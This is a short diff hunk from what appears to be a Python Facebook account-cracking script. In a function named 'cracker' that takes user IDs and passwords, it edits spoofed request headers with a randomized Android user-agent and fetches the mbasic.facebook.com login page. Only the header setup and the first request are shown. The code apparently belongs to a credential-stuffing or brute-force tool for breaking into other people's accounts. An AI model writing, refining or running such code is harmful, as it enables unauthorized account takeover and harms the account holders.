@@ -150,19 +150,13 @@ def cracker(uid,pwx,tl):
 			ses = requests.Session()
 			
 			heas = {"Host": "mbasic.facebook.com",
-				"content-length": "160",
-				"cache-control": "max-age=0",
-				"origin": "https://mbasic.facebook.com",
-				"upgrade-insecure-requests": "1",
-				"dnt": "1",
-				"content-type": "application/x-www-form-urlencoded",
+				"dnt": "1","upgrade-insecure-requests": "1",
 				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
-			    "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+				    "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
 				"sec-fetch-site": "same-origin",
 				"sec-fetch-mode": "no-cores",
 				"sec-fetch-user": "?1",
 				"sec-fetch-dest": "image",
-			    "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "en-US,en;q=0.9"}
 			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
